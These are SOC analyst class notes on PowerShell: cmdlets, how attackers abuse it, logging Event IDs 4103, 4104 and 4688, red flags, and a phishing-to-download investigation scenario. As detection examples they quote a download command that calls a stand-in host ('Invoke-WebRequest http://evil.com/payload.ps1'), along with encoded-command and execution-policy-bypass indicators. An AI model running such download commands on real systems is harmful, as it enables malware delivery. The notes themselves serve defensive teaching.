# SOC Analyst L1 — Class 21
# Windows PowerShell
---

# 1. Windows PowerShell

## What is PowerShell?

PowerShell is:

- Microsoft's command-line shell
- A scripting language

It is built for:

- System Administration
- Automation
- Remote Management

PowerShell is a legitimate Windows administration tool, but it is also frequently abused by attackers.

---

# 2. PowerShell in Cybersecurity

PowerShell is a **double-edged sword**.

## For Defenders / SOC Analysts

PowerShell can be used to:

- Automate incident response
- Perform forensic collection
- Hunt threats
- Interact with SIEM platforms
- Create scripted response playbooks
- Automate repetitive security tasks

## For Attackers

Attackers can use PowerShell for:

- Fileless malware
- In-memory execution
- Lateral movement
- Privilege escalation
- Credential-related attacks
- Downloading malicious payloads
- Executing commands and scripts

### ⭐ Interview Important

PowerShell itself is **not malware**.

It is a legitimate Microsoft tool that can be abused by attackers.

---

# 3. Why Attackers Love PowerShell

PowerShell is powerful because it can:

- Execute commands
- Download payloads
- Access the Registry
- Modify services
- Execute scripts in memory
- Bypass GUI restrictions

This makes PowerShell useful for both:

- System administrators
- Attackers

---

# 4. PowerShell Security Best Practices

The PDF's PowerShell security section recommends several defensive controls.

## Logging

Enable:

- Script Block Logging
- Module Logging
- PowerShell Transcription

These provide visibility into PowerShell activity and can help during investigation.

## PowerShell Remoting

- Restrict PowerShell Remoting to authorized administrators.
- Do not allow unnecessary remote PowerShell access.

## Constrained Language Mode

- Apply **Constrained Language Mode** where feasible.
- This can restrict certain PowerShell capabilities.

## SIEM Monitoring

Monitor the SIEM for suspicious PowerShell activity such as:

- Encoded commands
- Unusual network calls
- Unexpected modules

## General Security Practices

- Enforce least privilege
- Keep systems patched
- Use endpoint protection capable of detecting in-memory malicious behavior

### ⭐ SOC Important

PowerShell security is not only about blocking PowerShell.

The goal is to:

    Allow legitimate administration
            +
    Increase visibility
            +
    Detect suspicious abuse

---

# 5. PowerShell Architecture

The architecture diagram in the PDF shows how PowerShell commands are processed through different components.

## Hosting Application

A **host application** loads the Windows PowerShell engine into its process and uses it to perform operations.

Examples shown:

- PowerShell.exe
- Console Application
- Windows Application
- Web Application

## Host

The host acts as the interface between:

- Commands
- PowerShell Engine

## PowerShell Runspace

A **Runspace** is the operating environment for commands invoked by the host application.

## Pipeline

The pipeline is the container for cmdlets and scripts that are run programmatically by the host application.

Examples shown:

- `Get-Process`
- `Get-Item`
- `Out-Host`

## PowerShell Providers

PowerShell Providers are .NET programs that allow PowerShell to work with data stores.

Examples shown in the architecture include:

- FileSystem
- Other provider-based data

## Provider Table

The architecture diagram also shows provider information such as:

- AccessDb
- FileSystem

---

# 6. Basic / Common PowerShell Cmdlets

The PDF provides a list of 20 common PowerShell cmdlets.

| # | Cmdlet | Purpose |
|---|---|---|
| 1 | `Get-Help` | Displays information/help about cmdlets |
| 2 | `Get-Command` | Gets available cmdlets, functions and commands |
| 3 | `Get-Member` | Shows properties and methods of objects |
| 4 | `Get-Process` | Gets running processes |
| 5 | `Get-Service` | Gets services on the local or remote computer |
| 6 | `Get-Date` | Displays/formats current date and time |
| 7 | `Set-Location` | Changes the current working directory |
| 8 | `Get-Location` | Displays the current working directory |
| 9 | `Get-ChildItem` | Gets files and folders in a specified location |
| 10 | `Set-Content` | Creates a file or replaces its content |
| 11 | `Get-Content` | Displays the content of a file |
| 12 | `Add-Content` | Adds content to a file |
| 13 | `Remove-Item` | Deletes files, folders or registry items |
| 14 | `Copy-Item` | Copies an item to another location |
| 15 | `Move-Item` | Moves an item to another location |
| 16 | `New-Item` | Creates a new item such as a file/folder |
| 17 | `Test-Path` | Checks whether a specified path exists |
| 18 | `Select-Object` | Selects specific properties of objects |
| 19 | `Sort-Object` | Sorts objects by specified properties |
| 20 | `Measure-Object` | Returns count, sum, average, minimum, maximum, etc. |

## Tips from the PDF

### Get-Help

Use:

    Get-Help <cmdlet-name>

to get help and examples.

### Verb-Noun Naming

Most PowerShell cmdlets follow the:

    Verb-Noun

naming convention.

Examples:

    Get-Process
    Get-Service
    Set-Location

### Tab Autocomplete

The `Tab` key can be used for autocomplete.

## Cmdlet Example

    Get-Process | Sort-Object CPU -Descending | Select-Object -First 5

This pipeline:

1. Gets running processes
2. Sorts them by CPU usage in descending order
3. Selects the first 5 processes

### ⭐ SOC Important

These basic cmdlets are useful during Windows investigation.

Especially know:

    Get-Process
    Get-Service
    Get-Content
    Get-ChildItem
    Get-Command
    Get-Help
    Select-Object
    Sort-Object
    Measure-Object

---

# 7. PowerShell vs CMD

| CMD | PowerShell |
|---|---|
| Text-based | Object-based |
| Limited scripting | Powerful scripting |
| Older | Modern |
| Basic command-line operations | Advanced administration and automation |

## Important Difference

### CMD

Primarily works with text output.

### PowerShell

Works with **objects**.

This makes PowerShell more powerful for:

- Automation
- Administration
- Data processing
- Scripting

### ⭐ Interview Important

PowerShell is **object-based**, while CMD is primarily **text-based**.

---

# 8. PowerShell Execution Flow

Example:

    Get-Service

Execution flow:

    Command entered
          ↓
    PowerShell Engine processes
          ↓
    Cmdlet executed
          ↓
    Objects returned

## Step-by-Step

### Step 1 — Command Entered

The user enters a PowerShell command.

Example:

    Get-Service

### Step 2 — PowerShell Engine

The PowerShell engine processes the command.

### Step 3 — Cmdlet Execution

The appropriate cmdlet is executed.

### Step 4 — Objects Returned

PowerShell returns objects as output.

---

# 9. PowerShell and Attacks

Attackers use PowerShell for several malicious activities.

## 9.1 Malware Download

PowerShell can be used to download malicious payloads.

Example:

    Invoke-WebRequest

Attackers can abuse it to retrieve content from a remote location.

---

# 10. In-Memory Execution

PowerShell can execute malicious code in memory without necessarily writing the payload directly to disk.

This is associated with:

- In-memory execution
- Fileless malware

## SOC Relevance

In-memory activity can make traditional file-based detection more difficult.

Investigate:

- Process
- Command line
- Script
- User
- Network activity
- Related logs

---

# 11. Credential Dumping

Attackers may use PowerShell to interact with:

    LSASS

LSASS is the:

    Local Security Authority Subsystem Service

PowerShell can be abused as part of credential-related attacks involving LSASS.

### SOC Indicator

Suspicious PowerShell interaction with LSASS should be investigated.

---

# 12. Lateral Movement

PowerShell can support:

- Remote command execution
- Remote administration
- Lateral movement

Attackers can use PowerShell to execute commands on other systems.

---

# 13. Persistence

PowerShell can also be used to establish persistence.

Examples from the PDF:

- Registry modifications
- Scheduled tasks

Example:

    PowerShell
        ↓
    Registry Modification
        ↓
    Persistence

or:

    PowerShell
        ↓
    Scheduled Task
        ↓
    Persistence

---

# 14. Windows PowerShell Logging

Important PowerShell-related Event IDs:

| Event ID | Meaning |
|---|---|
| ⭐ 4103 | Module Logging |
| 🔥 4104 | Script Block Logging |
| 🔥 4688 | Process Creation |

---

# 15. Event ID 4103 — Module Logging

**4103 = PowerShell Module Logging**

It records PowerShell module-related activity.

## SOC Use

Can help identify:

- Modules being used
- PowerShell activity
- Suspicious module-related behavior

---

# 16. Event ID 4104 — Script Block Logging

**4104 = PowerShell Script Block Logging**

### 🔥 VERY IMPORTANT

Event ID **4104 logs the actual PowerShell script content**.

This is highly useful for SOC investigation.

## Example from the PDF

    Invoke-WebRequest http://evil.com/payload.ps1

If this appears in a 4104 event, the SOC analyst can see the suspicious script activity.

## SOC Investigation

When suspicious 4104 activity is detected:

1. Read the script content
2. Identify what the command does
3. Identify URLs/IPs
4. Check the user
5. Check the parent process
6. Correlate with other logs

---

# 17. Event ID 4688 — Process Creation

**4688 = Process Creation**

It can show that a new process was created.

Example:

    powershell.exe

SOC analysts can correlate 4688 with PowerShell logs.

Example:

    4688
    powershell.exe started
          ↓
    4104
    suspicious PowerShell script executed

This creates stronger evidence of malicious activity.

---

# 18. PowerShell Encoded Commands

Attackers may use encoded PowerShell commands.

Example:

    powershell.exe -EncodedCommand aGVsbG8=

## Why Attackers Use Encoding

- Obfuscation
- Avoid detection
- Hide the actual command

Encoding makes the command harder to read directly.

### ⭐ SOC Important

An encoded PowerShell command is **not automatically malicious**.

However, it should be investigated, especially when combined with other suspicious indicators.

---

# 19. SOC Response to Encoded Commands

Investigation flow:

    Detect encoded command
          ↓
    Decode command
          ↓
    Analyze command
          ↓
    Understand behavior
          ↓
    Correlate with other logs

## Analyze For

Check whether the command:

- Downloads content
- Executes code
- Modifies the Registry
- Creates persistence
- Performs credential-related activity
- Performs remote actions

---

# 20. PowerShell Red Flags

The PDF identifies these suspicious indicators:

- Encoded commands
- Download strings
- Base64
- Execution-policy bypass
- Hidden window

---

# 21. Encoded Commands

Example:

    powershell.exe -EncodedCommand <encoded_data>

Potential concern:

- Obfuscation
- Hidden command content
- Possible attempt to avoid detection

---

# 22. Download Strings

PowerShell commands involving downloads should be investigated.

Example:

    Invoke-WebRequest

SOC should determine:

- What was downloaded?
- Where did it come from?
- Who executed it?
- What happened after the download?

---

# 23. Base64

Base64 is a method of encoding data.

Attackers may use Base64 as part of command obfuscation.

### Important

Base64 itself is **not malicious**.

The analyst should decode and analyze the content.

---

# 24. Execution Policy Bypass

Example:

    powershell.exe -ExecutionPolicy Bypass

This is a suspicious indicator because it attempts to bypass PowerShell execution-policy restrictions.

## SOC Investigation

Check:

- Parent process
- User
- Command line
- Script content
- Network activity
- Other events around the execution

---

# 25. Hidden PowerShell Window

PowerShell can be executed with a hidden window.

This can reduce visibility to the user and may be suspicious when combined with other indicators.

## Multiple Red Flags

    Hidden Window
          +
    Encoded Command
          +
    Download Activity
          +
    Suspicious Parent Process
          ↓
    High Suspicion

---

# 26. Real SOC Scenario

The PDF gives a PowerShell investigation scenario.

## Event ID 4688

    Parent: winword.exe
    Child: powershell.exe

This shows:

    winword.exe
          ↓
    powershell.exe

The parent-child relationship is suspicious.

## Event ID 4104

Script content:

    Invoke-WebRequest evil.com

This indicates that PowerShell was used to make a web request to a suspicious external location.

---

# 27. SOC Conclusion

Attack chain:

    Phishing
        ↓
    PowerShell Execution
        ↓
    Malware Download

The SOC analyst observes:

    winword.exe
         ↓
    powershell.exe
         ↓
    Invoke-WebRequest
         ↓
    External malicious location

This creates a clear attack story.

---

# 28. PowerShell Investigation Flow

When suspicious PowerShell activity is detected:

    PowerShell Alert
          ↓
    Check 4688
          ↓
    Identify Parent Process
          ↓
    Check Command Line
          ↓
    Check 4104
          ↓
    Analyze Script
          ↓
    Check User
          ↓
    Check Network Activity
          ↓
    Correlate Timeline
          ↓
    Determine Attack Story

---

# 29. Parent-Child Relationship

Parent-child relationships help determine how PowerShell was launched.

## Suspicious Example

    winword.exe
         ↓
    powershell.exe

Possible attack chain:

    Phishing Document
         ↓
    Malicious Document Activity
         ↓
    PowerShell
         ↓
    Malware Download

---

# 30. SOC Analyst Mindset

When you see PowerShell, do not immediately think:

    "PowerShell = Malware"

Instead ask:

- Who executed PowerShell?
- Why was it executed?
- Which process started it?
- What command was executed?
- Was the command encoded?
- Was something downloaded?
- Was execution policy bypassed?
- Was the window hidden?
- Did the script interact with LSASS?
- Did it modify the Registry?
- Did it create persistence?
- What happened after PowerShell execution?

---

# 31. ⭐ Important Event IDs

| Event ID | Meaning | Priority |
|---|---|---|
| 4103 | Module Logging | Important |
| 4104 | Script Block Logging | 🔥 VERY IMPORTANT |
| 4688 | Process Creation | 🔥 VERY IMPORTANT |

## Remember

    4103 → Module Logging
    4104 → Script Block Logging
    4688 → Process Creation

---

# 32. 🔥 PowerShell SOC Cheat Sheet

    PowerShell
        ↓
    Legitimate Microsoft Tool
        ↓
    Can be abused by attackers
        ↓
    Check 4688
        ↓
    Check 4104
        ↓
    Look for:
      - Encoded commands
      - Base64
      - Downloads
      - Invoke-WebRequest
      - ExecutionPolicy Bypass
      - Hidden Window
      - LSASS interaction
      - Registry modification
      - Scheduled Tasks
        ↓
    Correlate
        ↓
    Build Attack Story

---

# 33. ⭐ Interview Important

## Q1. What is PowerShell?

PowerShell is Microsoft's command-line shell and scripting language designed for system administration, automation and remote management.

## Q2. Why is PowerShell important in cybersecurity?

Because it is a legitimate and powerful Windows tool that can also be abused by attackers for execution, downloading payloads, in-memory execution, credential-related attacks, lateral movement and persistence.

## Q3. Is PowerShell malware?

No.

PowerShell is a legitimate Microsoft tool. Attackers can abuse it for malicious activities.

## Q4. What is Event ID 4104?

Event ID 4104 is PowerShell Script Block Logging and can log the actual PowerShell script content.

## Q5. Why is 4104 important for SOC analysts?

Because it can provide visibility into the actual PowerShell script content being executed.

## Q6. What is Event ID 4103?

4103 represents PowerShell Module Logging.

## Q7. What is Event ID 4688?

4688 represents Process Creation.

## Q8. Why should encoded PowerShell commands be investigated?

Attackers may use encoding/obfuscation to hide commands and avoid detection.

## Q9. Give examples of suspicious PowerShell behavior.

Examples:

    powershell.exe -EncodedCommand <data>

    powershell.exe -ExecutionPolicy Bypass

Other indicators:

- Base64
- Download activity
- Hidden window
- Suspicious parent process

## Q10. What is Invoke-WebRequest?

It can be used to make web requests and retrieve content. Attackers can abuse it to download malicious payloads.

## Q11. Why is the parent process important?

It helps determine how and why PowerShell was started.

Example:

    winword.exe → powershell.exe

This can indicate suspicious activity originating from a document.

---

# 34. Final Attack Chain

## Real SOC Example

    Phishing
       ↓
    winword.exe
       ↓
    powershell.exe
       ↓
    Event ID 4688
       ↓
    Event ID 4104
       ↓
    Invoke-WebRequest
       ↓
    Malware Download

### SOC Conclusion

    Phishing
        →
    PowerShell Execution
        →
    Malware Download

---

# 35. Final Revision Map

## PowerShell

    Command-Line Shell
          +
    Scripting Language
          ↓
    Administration
    Automation
    Remote Management

## Attacker Abuse

    PowerShell
       ↓
    Execution
       ↓
    Download
       ↓
    In-Memory Execution
       ↓
    Credential Attacks
       ↓
    Lateral Movement
       ↓
    Persistence

## Defensive Logging

    4103 → Module Logging
    4104 → Script Block Logging
    4688 → Process Creation

## Red Flags

    Encoded Command
    Base64
    Download
    Invoke-WebRequest
    ExecutionPolicy Bypass
    Hidden Window
    Suspicious Parent Process

## Security Best Practices

    Script Block Logging
    Module Logging
    PowerShell Transcription
    Restrict PowerShell Remoting
    Constrained Language Mode
    SIEM Monitoring
    Least Privilege
    System Patching
    Endpoint Protection

## Investigation

    Who?
      ↓
    Parent Process?
      ↓
    What Command?
      ↓
    4104 Script?
      ↓
    Download?
      ↓
    Network Activity?
      ↓
    What happened next?

---